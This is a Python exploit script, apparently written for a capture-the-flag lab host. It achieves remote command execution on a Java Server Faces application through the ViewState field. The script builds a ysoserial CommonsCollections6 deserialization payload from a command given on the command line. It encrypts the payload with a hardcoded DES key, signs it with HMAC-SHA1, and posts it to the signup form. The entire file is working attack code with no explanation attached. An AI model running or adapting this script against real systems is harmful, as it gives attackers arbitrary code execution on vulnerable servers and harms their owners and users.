import urllib
import base64
import subprocess
import requests
import hashlib
import pyDes
import hmac
import sys

url = "http://10.10.10.130:8080/userSubscribe.faces"
r = requests.get(url)
cookie = r.headers['set-cookie']

cmd = sys.argv[1]

secret = base64.b64decode("SnNGOTg3Ni0=")
cipher = pyDes.des(secret, pad=None, padmode=pyDes.PAD_PKCS5)

ysoserial = 'java -jar /opt/ysoserial-master-SNAPSHOT.jar CommonsCollections6 "' + cmd + '"'
payload = subprocess.check_output(ysoserial, shell=True)
payload = cipher.encrypt(payload)
hmacSignature = hmac.new(secret, payload, hashlib.sha1).digest()
payload = base64.b64encode(payload + hmacSignature)
payload = urllib.quote(payload)

headers = {"Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
data = "j_id_jsp_1623871077_1%3Aemail=caca&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=" + payload
r = requests.post(url, data=data, headers=headers)
